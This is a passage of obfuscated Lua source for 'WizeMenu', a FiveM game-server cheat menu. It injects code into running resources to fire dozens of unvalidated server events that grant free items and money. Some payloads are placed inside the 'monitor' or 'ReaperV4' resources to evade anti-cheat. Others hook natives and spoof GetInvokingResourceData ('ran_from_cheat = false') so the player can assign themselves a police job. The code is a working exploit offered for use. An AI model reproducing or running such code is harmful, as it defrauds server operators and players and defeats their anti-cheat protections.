TriggerServerEvent("ars_whitewidow_v2:Buyitem", { items = { { id = "%s", image = "CodeFinder", name = "CodeFinder", page = 1, price = 500, quantity = %d, stock = 999999999999999, totalPrice = 0 } }, method = "cash", total = 0 }, "cash") end)'):format(v316,v317));v252=true;elseif (v271.id=="av_business") then local v487=0 -0 ;while true do if (v487==(0 -0)) then v73(('pcall(function() TriggerServerEvent("av_business:addItem", "%s", %d, 9999) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="boii_drugs") then local v488=0;while true do if (v488==(0 -0)) then v73(('pcall(function() TriggerServerEvent("boii-drugs:sv:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="boii_moneylaunderer") then local v489=801 -(499 + 302) ;while true do if (v489==0) then v73(('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:PayPlayer", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="boii_pawnshop") then v73(('pcall(function() TriggerServerEvent("boii-pawnshop:sv:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="boii_salvage_diving") then local v490=866 -(39 + 827) ;while true do if (v490==(0 -0)) then v73('pcall(function() TriggerServerEvent("boii-salavagediving:server:JewelleryBag") end)');v252=true;break;end end elseif (v271.id=="boii_whitewidow") then local v491=0;while true do if (v491==(0 -0)) then v73(('pcall(function() TriggerServerEvent("boii_whitewidow:server:itemadd", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="brutal_hunting") then v73(('pcall(function() TriggerServerEvent("brutal_hunting:server:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="brutal_shop_robbery") then local v492=0 -0 ;while true do if (v492==0) then v73(('pcall(function() TriggerServerEvent("brutal_shop_robbery:server:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="cfx_tcd_starter") then v73('pcall(function() TriggerEvent("cfx-tcd-starterpack:client:openStarterPack") end)');v252=true;elseif (v271.id=="core_crafting") then local v493=0;while true do if (v493==(0 -0)) then v73(('pcall(function() TriggerServerEvent("core_crafting:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="d3mba_heroin") then local v494=0 + 0 ;while true do if (v494==0) then v73(('pcall(function() TriggerServerEvent("d3MBA-heroin:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="dcweedroll") then v73(('pcall(function() TriggerServerEvent("dcweedroll:server:itemadd", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="dcweedrollnew") then local v495=0 -0 ;while true do if (v495==0) then v73(('pcall(function() TriggerServerEvent("dcweedrollnew:server:itemadd", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="devcore_needs") then v73(('pcall(function() TriggerServerEvent("devcore_needs:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="devcore_smokev2") then v73(('pcall(function() TriggerServerEvent("devcore_smokev2:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="dusa_pets") then v73(('pcall(function() TriggerServerEvent("dusa-pets:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="dusa_pet_shop") then v73(('pcall(function() TriggerServerEvent("dusa_pet:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="dv_donut_delivery") then local v496=0 + 0 ;while true do if (v496==(0 -0)) then v73(('pcall(function() TriggerServerEvent("dv-donutdeliveryjob:server:giveReward", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="esx_weashop") then local v497=0;while true do if (v497==(104 -(103 + 1))) then v73(('pcall(function() TriggerServerEvent("esx_weashop:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ez_lib") then local v498=554 -(475 + 79) ;while true do if ((0 -0)==v498) then v73(('pcall(function() TriggerServerEvent("ez_lib:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="fivecode_camping") then local v499=0 -0 ;while true do if (v499==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("fivecode_camping:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="food_mechanics") then local v500=0 + 0 ;while true do if (v500==0) then v73(('pcall(function() TriggerServerEvent("food_mechanics:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="forge_starter") then local v501=1503 -(1395 + 108) ;while true do if (v501==(0 -0)) then v73(('pcall(function() TriggerServerEvent("forge-starter:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="fs_placeables") then local v502=1204 -(7 + 1197) ;while true do if ((0 + 0)==v502) then v73(('pcall(function() TriggerServerEvent("fs_placeables:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="fuksus_shops") then local v503=0 + 0 ;while true do if (v503==0) then v73(('pcall(function() TriggerServerEvent("fuksus-shops:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="gardener_job") then local v504=0;while true do if (v504==0) then v73(('pcall(function() TriggerServerEvent("gardenerjob:server:giveReward", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="guatau_consumibles") then local v505=0;while true do if ((319 -(27 + 292))==v505) then v73(('pcall(function() TriggerServerEvent("guataubaconsumibles:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="hg_wheel") then v73(('pcall(function() TriggerServerEvent("hg-wheel:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="horizon_payment") then local v506=0;while true do if (v506==(0 -0)) then v73(('pcall(function() TriggerServerEvent("horizon_paymentsystem:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="complete_hunting") then local v507=0 -0 ;while true do if (0==v507) then v73(('pcall(function() TriggerServerEvent("hunting:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="inside_fruitpicker") then v73(('pcall(function() TriggerServerEvent("inside-fruitpicker:server:giveReward", %d) end)'):format(v317));v252=true;elseif (v271.id=="inverse_consumables") then local v508=0 -0 ;while true do if ((0 -0)==v508) then v73(('pcall(function() TriggerServerEvent("inverse-consumables:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="it_lib") then v73(('pcall(function() TriggerServerEvent("it_lib:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="jg_mechanic") then local v509=0 -0 ;while true do if (v509==(139 -(43 + 96))) then v73(('pcall(function() TriggerServerEvent("jg-mechanic:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_bakery") then local v510=0 -0 ;while true do if (v510==0) then v73(('pcall(function() TriggerServerEvent("jim-bakery:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_beanmachine") then local v511=0;while true do if (v511==(0 -0)) then v73(('pcall(function() TriggerServerEvent("jim-beanmachine:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_burgershot") then local v512=0;while true do if (0==v512) then v73(('pcall(function() TriggerServerEvent("jim-burgershot:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_catcafe") then local v513=0;while true do if (v513==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("jim-catcafe:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_consumables") then local v514=0 + 0 ;while true do if (v514==0) then v73(('pcall(function() TriggerServerEvent("jim-consumables:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_mechanic") then v73(('pcall(function() TriggerServerEvent("jim-mechanic:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="jim_mining") then local v515=0;while true do if (v515==(0 -0)) then v73(('pcall(function() TriggerServerEvent("jim-mining:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_pizzathis") then local v516=0 + 0 ;while true do if (v516==(0 -0)) then v73(('pcall(function() TriggerServerEvent("jim-pizzathis:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_recycle") then v73(('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="jim_shops_blackmarket") then local v517=0;while true do if (v517==(0 + 0)) then v73(('pcall(function() Config.Goodies = { label = "Blackmarket", slots = 1, items = { [1] = { name = "%s", price = 0, amount = %d, info = {}, type = "item", slot = 1 } } } end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="jim_shops_open") then local v518=0;while true do if (v518==0) then v73('pcall(function() TriggerServerEvent("jim-shops:ShopOpen", "shop", "illegalshit", Config.Goodies) end)');v252=true;break;end end elseif (v271.id=="kaves_drugsv2") then local v519=0 + 0 ;while true do if (v519==(1751 -(1414 + 337))) then v73(('pcall(function() TriggerServerEvent("kaves_drugsv2:server:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="mt_restaurants") then local v520=1940 -(1642 + 298) ;while true do if (0==v520) then v73(('pcall(function() TriggerServerEvent("mt-restaurants:server:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="mt_printers") then local v521=0 -0 ;while true do if (v521==(0 -0)) then v73(('pcall(function() TriggerServerEvent("__ox_cb_mt_printers:server:itemActions", "mt_printers", "mt_printers:server:itemActions:codeplug", "%s", "add") end)'):format(v316));v252=true;break;end end elseif (v271.id=="nx_cayo") then local v522=0;while true do if (v522==0) then v73(('pcall(function() TriggerServerEvent("nx-cayo:server:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="okok_crafting") then local v523=0;while true do if (v523==(0 -0)) then v73(('pcall(function() TriggerServerEvent("okokCrafting:claimAll", "paletogeneral", { ["paletogeneral"] = { [1] = { ["item"] = "%s", ["randomID"] = 431916296, ["recipe"] = { [1] = { [1] = "cash", [2] = 1, [3] = "true", [4] = "false" } }, ["suc"] = true, ["xp"] = 6, ["itemName"] = "Pistol", ["time"] = 0, ["amount"] = %d, ["isPending"] = false, ["isDone"] = true, ["isItem"] = true, ["isDis"] = false, ["sucPC"] = 85 } } }) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="pug_business_creator") then v73(('pcall(function() TriggerServerEvent("Pug:server:NewGivBusinessItemAfterHacks", true, "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="pug_chopping") then v73(('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingCarPay", %d) end)'):format(v317));v252=true;elseif (v271.id=="pug_fishing") then v73(('pcall(function() TriggerServerEvent("Pug:server:GiveFish", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="pug_robbery_creator") then v73(('pcall(function() TriggerServerEvent("Pug:server:RobberyGiveItem", true, "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="qb_crafting") then v73(('pcall(function() TriggerServerEvent("qb-crafting:server:receiveItem", "%s", {}, %d, 0) end)'):format(v316,v317));v252=true;elseif (v271.id=="qb_drugs") then local v524=0 + 0 ;while true do if (v524==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("qb-drugs:server:giveDrugs", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="qb_garbage_job") then v73(('pcall(function() TriggerServerEvent("qb-garbagejob:server:PayShift", %d, "") end)'):format(v317));v252=true;elseif (v271.id=="qb_hotdog_job") then local v525=972 -(357 + 615) ;while true do if (0==v525) then v73(('pcall(function() local ped = GetPlayerPed(-1) local pedCoords = GetEntityCoords(ped) local HotdogsForSale = 1 local SellingPrice = %d TriggerServerEvent("qb-hotdogjob:server:Sell", pedCoords, HotdogsForSale, SellingPrice) end)'):format(v317));v252=true;break;end end elseif (v271.id=="qb_recycle_job") then local v526=0 + 0 ;while true do if (v526==(0 -0)) then v73(('pcall(function() TriggerServerEvent("recycle:giveReward", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="qb_trash_search") then local v527=0 + 0 ;while true do if (v527==0) then v73(('pcall(function() TriggerServerEvent("qb-trashsearch:server:givemoney", math.random(%d, 9999999999999999)) end)'):format(v317));v252=true;break;end end elseif (v271.id=="qb_warehouse") then local v528=0;while true do if (v528==(0 -0)) then v73(('pcall(function() TriggerServerEvent("inside-warehouse:Payout", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="rm_camperv") then local v529=0 + 0 ;while true do if (v529==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("camperv:server:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ry_rent") then local v530=0 + 0 ;while true do if (v530==(1301 -(384 + 917))) then v73(('pcall(function() TriggerServerEvent("ry-vehiclerental:giveMoney", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="savana_trucker") then local v531=0;while true do if (v531==(697 -(128 + 569))) then v73(('pcall(function() TriggerServerEvent("savana-truckerJob:addXpAndMoney", %d, %d) end)'):format(v317,v317));v252=true;break;end end elseif (v271.id=="sayer_jukebox") then v73(('pcall(function() TriggerServerEvent("sayer-jukebox:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="sell_usb") then local v532=1543 -(1407 + 136) ;while true do if (v532==0) then v73(('pcall(function() TriggerEvent("sell_usb:findClient", { i = 8, label = "CodePlugRunsYourShit", type = "codeplug", zone = "The Meat Quarter", price = %d, count = 0 }) end)'):format(v317));v252=true;break;end end elseif (v271.id=="snipe_boombox") then local v533=1887 -(687 + 1200) ;while true do if (v533==0) then v73(('pcall(function() TriggerServerEvent("snipe-boombox:server:pickup", %d, vector3(0.0, 0.0, 0.0), "%s") end)'):format(v317,v316));v252=true;break;end end elseif (v271.id=="solos_cashier") then local v534=1710 -(556 + 1154) ;while true do if (v534==(0 -0)) then v73(('pcall(function() TriggerServerEvent("solos-cashier:server:addmoney", "bank", %d) end)'):format(v317));v252=true;break;end end elseif (v271.id=="solos_food") then local v535=95 -(9 + 86) ;while true do if (v535==(421 -(275 + 146))) then v73(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="solos_hookah") then local v536=0 + 0 ;while true do if (0==v536) then v73(('pcall(function() TriggerServerEvent("solos-hookah:server:Buy-Item", "%s", %d, 0) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="solos_jointroll") then local v537=0;while true do if (v537==0) then v73(('pcall(function() TriggerServerEvent("solos-jointroll:server:ItemAdd", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="solos_joints") then v73(('pcall(function() TriggerServerEvent("solos-joints:server:itemadd", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="solos_methlab") then local v538=64 -(29 + 35) ;while true do if (v538==(0 -0)) then v73(('pcall(function() TriggerServerEvent("solos-methlab:server:itemadd", "%s", %d, true) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="solos_moneywash") then local v539=0;while true do if (v539==(0 -0)) then v73(('pcall(function() TriggerServerEvent("solos-moneywash:server:ItemAdd", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="solos_restaurants") then local v540=0;while true do if (v540==(0 -0)) then v73(('pcall(function() TriggerServerEvent("solos-food:server:itemadd", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="t1ger_gangsystem") then v73(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d, "codeplugrunsu") end)'):format(v316,v317));v252=true;elseif (v271.id=="t1ger_lib") then v73(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="zat_weed") then local v541=0 + 0 ;while true do if (0==v541) then v73(('pcall(function() TriggerServerEvent("zat-weed:server:AddItem", "%s", nil, %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="zat_farming") then local v542=1012 -(53 + 959) ;while true do if (v542==0) then v73(('pcall(function() TriggerServerEvent("zat-farming:server:GiveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="xmmx_letscookplus") then local v543=0;while true do if (v543==0) then v73(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:BuyItems", { totalCost = 0, cart = { { name = "%s", quantity = %d } } }, "bank") end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="fromthebottom_la") then v73(('pcall(function() TriggerServerEvent("Pug:server:GiveChoppingItem", true, "%s", %d, nil) end)'):format(v316,v317));v252=true;elseif (v271.id=="central_valley_v3") then local v544=408 -(312 + 96) ;while true do if (v544==(0 -0)) then v73(('pcall(function() TriggerServerEvent("jim-consumables:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="da_ghetto_la_rp") then local v545=0;while true do if (v545==(285 -(147 + 138))) then v73(('pcall(function() TriggerServerEvent("it-lib:toggleItem", true, "%s", %d, nil) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="mafia_land_rp") then v73(('pcall(function() TriggerServerEvent("devcore_smokev2:server:AddItem", "%s") end)'):format(v316));v252=true;elseif (v271.id=="land_of_hustlers_rp") then v73(('pcall(function() TriggerServerEvent("devcore_needs:server:AddItem", "%s") end)'):format(v316));v252=true;elseif (v271.id=="gangsters_paradice") then local v546=899 -(813 + 86) ;while true do if (v546==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("r_scripts-tuningV2:server:buyItem", "%s", %d, 0) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="thegardens_chicago") then v73('pcall(function() TriggerServerEvent("esx-qalle-jail:prisonWorkReward") end)');v252=true;elseif (v271.id=="cold_hearted_nyc") then local v547=0;while true do if (v547==(0 -0)) then v73(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="revenge_serious_rp") then local v548=0;while true do if ((492 -(18 + 474))==v548) then v73(('pcall(function() TriggerServerEvent("jim-consumables:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="straight_out_the_gutta_srp") then local v549=0;while true do if (v549==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("t1ger_lib:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="get_wild_chiraq_rp") then local v550=0 -0 ;while true do if (v550==0) then v73(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="ghost_city_roleplay") then local v551=1086 -(860 + 226) ;while true do if (v551==(303 -(121 + 182))) then v73(('pcall(function() TriggerServerEvent("apex_cluckinbell:client:addItem", "%s") end)'):format(v316));v252=true;break;end end elseif (v271.id=="truevision_roleplay") then local v552=0 + 0 ;while true do if (v552==(1240 -(988 + 252))) then v73(('pcall(function() TriggerServerEvent("tvrpdrugs:server:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="tales_from_the_hood_rp") then local v553=0 + 0 ;while true do if (v553==(0 + 0)) then v73(('pcall(function() TriggerServerEvent("nk:barbeque:addItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="the_strip_rp") then local v554=0;while true do if (v554==(1970 -(49 + 1921))) then v73(('pcall(function() TriggerServerEvent("matti-airsoft:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="murdaville_rp") then v73('pcall(function() TriggerServerEvent("apx_starterpack:server:markAsUsed") end)');v252=true;elseif (v271.id=="the_flats_roleplay") then v73(('pcall(function() TriggerServerEvent("qb-advancedrugs:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="la_chronicles_roleplay") then local v555=0;while true do if (v555==(890 -(223 + 667))) then v73(('pcall(function() TriggerServerEvent("horizon_paymentsystem:giveItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="toe_tag_world_rp") then local v556=52 -(51 + 1) ;while true do if (v556==0) then v73(('pcall(function() TriggerServerEvent("boii-moneylaunderer:sv:AddItem", "%s", %d) end)'):format(v316,v317));v252=true;break;end end elseif (v271.id=="federal_nightmares_nyc") then v73(('pcall(function() TriggerServerEvent("xmmx_letscookplus:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="cfw_x3f6_s8") then v73(('pcall(function() TriggerServerEvent("jim-recycle:server:toggleItem", true, "%s", %d) end)'):format(v316,v317));v252=true;elseif (v271.id=="white_chalk_rp") then v73(('pcall(function() TriggerServerEvent("angelicxs-CivilianJobs:Server:GainItem", "%s", math.floor(%d)) end)'):format(v316,v317));v252=true;end if v252 then MachoMenuNotification("WizeMenu","Trigger Worked, Enjoy! Using: "   .. v271.name ,8 -3 );break;end end end if  not v252 then local v295={["qb-uwujob"]=function() MachoInjectResource2(3,(v47("monitor") and "monitor") or (v47("oxmysql") and "oxmysql") or "any" ,[[
                        local function aswdaw4atsdf()
                            TriggerServerEvent("qb-uwujob:addItem", "]]   .. v248   .. [[", ]]   .. v249   .. [[)
                        end
                        aswdaw4atsdf()
                    ]] );end,skirpz_drugplug=function() MachoInjectResource2(6 -3 ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        local function fawfafffsfzxfzx()
                            XTYZ = CreateThread
                            XTYZ(function()
                                for i = 1, ]]   .. v249   .. [[ do
                                    local dealer = "shop" .. math.random(1000,9999)
                                    TriggerServerEvent = TriggerServerEvent
                                    TriggerServerEvent('shop:purchaseItem', shop, ']]   .. v248   .. [[', 0)
                                    Wait(100)
                                end
                            end)
                        end
                        fawfafffsfzxfzx()
                    ]] );end,ak47_whitewidowv2=function() MachoInjectResource2(3,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        local function aXj49WqTpL()
                            local keyName = "ak47_whitewidowv2:process"
                            TriggerServerEvent(keyName, "]]   .. v248   .. [[", {money = 0}, ]]   .. v249   .. [[, 0)
                        end
                        aXj49WqTpL()
                    ]] );end,ak47_business=function() MachoInjectResource2(1128 -(146 + 979) ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        local function agjw37257gj()
                            local keyName = "ak47_business:processed"
                            TriggerServerEvent(keyName, "]]   .. v248   .. [[", ]]   .. v249   .. [[)
                        end
                        agjw37257gj()
                    ]] );end,ars_hunting=function() MachoInjectResource2(3,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        local function ZqMwLpTrYv()
                            local keyName = "ars_hunting:sellBuyItem"
                            TriggerServerEvent(keyName, { buy = true, item = "]]   .. v248   .. [[", price = 0, quantity = ]]   .. v249   .. [[ })
                        end
                        ZqMwLpTrYv()
                    ]] );end,fivecode_camping=function() MachoInjectResource2(3,(v47("monitor") and "monitor") or "any" ,[[
                        local function GnRtCvXpKa()
                            local keyName = 'fivecode_camping:callCallback'
                            local KeyNameParams = 'fivecode_camping:shopPay'
                            TriggerServerEvent(keyName, KeyNameParams, 0, {
                                ['price'] = 0,
                                ['item'] = "]]   .. v248   .. [[",
                                ['amount'] = ]]   .. v249   .. [[,
                                ['label'] = 'WizeMenu'
                            }, {
                                ['args'] = {
                                    ['payment'] = {
                                        ['bank'] = true,
                                        ['cash'] = true
                                    }
                                },
                                ['entity'] = 9218,
                                ['distance'] = 0.64534759521484,
                                ['hide'] = false,
                                ['type'] = 'bank',
                                ['label'] = 'Open Shop',
                                ['coords'] = 'vector3(-773.2181, 5597.66, 33.97217)',
                                ['name'] = 'npcShop-vec4(-773.409973, 5597.819824, 33.590000, 172.910004)'
                            })
                        end
                        GnRtCvXpKa()
                    ]] );end,spoodyGunPlug=function() MachoInjectResource2(1 + 2 ,(v47("spoodyGunPlug") and "spoodyGunPlug") or "any" ,[[
                        local function GnRtCvXpKa()
                            common:giveItem({ { item = "]]   .. v248   .. [[", amount = ]]   .. v249   .. [[ } })  
                        end
                        GnRtCvXpKa()
                    ]] );end,["solos-weedtable"]=function() MachoInjectResource2(608 -(311 + 294) ,(v47("ReaperV4") and "ReaperV4") or (v47("monitor") and "monitor") or "any" ,[[
                        local function aqrqtsgw32w523w()
                            local keyName = "solos-weed:server:itemadd"
                            TriggerServerEvent(keyName, "]]   .. v248   .. [[", ]]   .. v249   .. [[)
                        end
                        aqrqtsgw32w523w()
                    ]] );end};local v296=false;for v318,v319 in pairs(v295) do if (GetResourceState(v318)=="started") then local v363=0 -0 ;while true do if (v363==(0 + 0)) then v319();v296=true;break;end end end end if  not v296 then MachoMenuNotification("[NOTIFICATION] WizeMenu","No Triggers Found.");end end end);if ((GetResourceState("es_extended")=="started") or (GetResourceState("core")=="started")) then MachoMenuButton(v45[1445 -(496 + 947) ],"Setjob Police #1 (New)",function() if (GetResourceState("es_extended")=="started") then local v345=0;while true do if (v345==(1358 -(1233 + 125))) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Your job has been set to police");MachoInjectResource2(NewThreadNs,"es_extended",[[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "police",
                    label = "Police",
                    grade = 3,
                    grade_name = "lieutenant",
                    grade_label = "Lieutenant"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]]);break;end end elseif (GetResourceState("core")=="started") then local v403=0 + 0 ;while true do if (v403==(0 + 0)) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Your job has been set to police");MachoInjectResource2(NewThreadNs,"core",[[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end

                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end

                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                hNative("ESX.SetPlayerData", function(originalFn, ...) return originalFn(...) end)

                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "core/server/main.lua",
                    execution_id = "324341234567890"
                }

                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end

                ESX.SetPlayerData("job", {
                    name = "police",
                    label = "Police",
                    grade = 3,
                    grade_name = "lieutenant",
                    grade_label = "Lieutenant"
                })
                GetInvokingResourceData = original_GetInvokingResourceData
            ]]);break;end end else print("Neither core nor es_extended started");end end);end if ((GetResourceState("scripts")=="started") or (GetResourceState("framework")=="started")) then MachoMenuButton(v45[1 + 1 ],"Set Job #2(Police)",function() if (GetResourceState("scripts")=="started") then MachoMenuNotification("[NOTIFICATION] WizeMenu","Your job has been set to police");MachoInjectResource2(NewThreadNs,"scripts",[[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "scripts/server/main.lua",
                    execution_id = "324341234567890"
                }
                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end
                local lp = LocalPlayer
                if lp and lp.state then
                    lp.state:set("job", {
                        name = "police",
                        label = "Police",
                        grade = 4,
                        grade_name = "sergeant"
                    }, true)
                    print("[✅] Job set to police successfully.")
                else
                    print("[⚠️] Failed to set job: LocalPlayer or state not available.")
                end
                GetInvokingResourceData = original_GetInvokingResourceData
            ]]);elseif (GetResourceState("framework")=="started") then local v404=1645 -(963 + 682) ;while true do if (v404==(0 + 0)) then MachoMenuNotification("[NOTIFICATION] WizeMenu","Your job has been set to police");MachoInjectResource2(NewThreadNs,"framework",[[
                function hNative(nativeName, newFunction)
                    local originalNative = _G[nativeName]
                    if not originalNative or type(originalNative) ~= "function" then
                        return
                    end
                    _G[nativeName] = function(...)
                        return newFunction(originalNative, ...)
                    end
                end
                hNative("CreateThread", function(originalFn, ...) return originalFn(...) end)
                hNative("Wait", function(originalFn, ...) return originalFn(...) end)
                hNative("GetInvokingResourceData", function(originalFn, ...) return originalFn(...) end)
                local fake_execution_data = {
                    ran_from_cheat = false,
                    path = "framework/server/main.lua",
                    execution_id = "324341234567890"
                }
                local original_GetInvokingResourceData = GetInvokingResourceData
                GetInvokingResourceData = function()
                    return fake_execution_data
                end
                local lp = LocalPlayer
                if lp and lp.state then
                    lp.state:set("job", {
                        name = "police",
                        label = "Police",
                        grade = 4,
                        grade_name = "sergeant"
                    }, true)
